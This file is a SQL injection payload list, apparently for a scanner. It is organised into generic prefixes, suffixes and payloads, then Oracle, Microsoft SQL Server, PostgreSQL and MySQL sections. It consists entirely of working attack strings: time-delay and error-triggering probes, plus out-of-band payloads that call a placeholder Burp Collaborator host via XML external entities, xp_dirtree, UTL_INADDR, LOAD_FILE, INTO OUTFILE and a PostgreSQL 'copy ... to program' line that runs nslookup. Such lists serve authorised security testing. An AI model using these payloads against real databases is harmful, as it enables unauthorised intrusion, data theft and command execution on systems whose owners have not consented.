# Global
## Prefix 0
' 
') 
'))  
) 
)) 
" 
\' 
\" 
'' 
"" 
## Prefix 1
AND 
OR 
; 
UNION 
## Full Prefix
;  
## Full Suffix
--
/*
%00
## Payload
1 == 1
'1' == '1
## Full Payload
(SELECT null)
(SELECT 1)
(SELECT 'a')
# Oracle
## Payload
dbms_pipe.receive_message(('a'),10)
TO_CHAR(1/0)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
# Microsoft
## Payload
WAITFOR DELAY '0:0:10'
1/0
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
# PostgreSQL
## Payload
pg_sleep(10)
1/(SELECT 0)
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
# MySQL 
## Full Suffix
-- -
## Payload
SLEEP(10)
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'